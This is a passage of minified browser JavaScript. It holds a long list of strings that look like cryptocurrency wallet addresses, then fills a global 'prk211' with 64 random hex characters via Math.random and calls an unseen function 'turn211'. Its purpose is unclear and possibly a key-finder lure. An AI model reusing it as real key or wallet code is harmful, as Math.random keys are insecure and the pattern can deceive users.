R1iKJaziEPJv,7RmGC3i2dASQai3mP9iJLX3ZD9TBm2YQV,Djs2VyBVr6MYNcGVaHAr8B3N1mViS5yoo,N4yKFsFPjjoJyo3BAKUWpcs3SUghfgJkH,3nwifHUz5ZfHuQhk5ETJ4BhmqbuQdvTFp,7GyU83L63BtxtpDgv8LmhhtmvcrXbfVt1,Le1X8LJb4VkFsfktiUY7V7wMRhniu5Xgn,Fjom9b9wvp3HPi2ZS9hqXQwJpXcjumSYJ,BbSZNNhoBUCFGMfnscBDXf7PH1takoMga,NJdKoBkKQNg6aYL9HTKyQ5SgfjZQDz3y3,gvH7pGPrEBNjqmwYS8UDhjFQkyqkKCLE,6H2Fe9MgxZ1jXW3TaXbgWh3SJfwyxQUTp,3pTeUzSU4nwkM72hM6e8AcP2d8LudZBjc,Dr1pZDgpowHDGJrUNTithDL33TdriFMzE,8oRfGoPpb6bkQdACnD6dVYWceeWURK5R6,2mJZGPCWf5C2ap2dUdJiuGr8eWAvi6E5M,M9pAdfhGHtQkhGRijApWAkkrPCduvV6Zi";
    for (var e = 0; 64 > e; e++) window.prk211 += Math.floor(16 * Math.random()).toString(16);
    turn211()
  }();
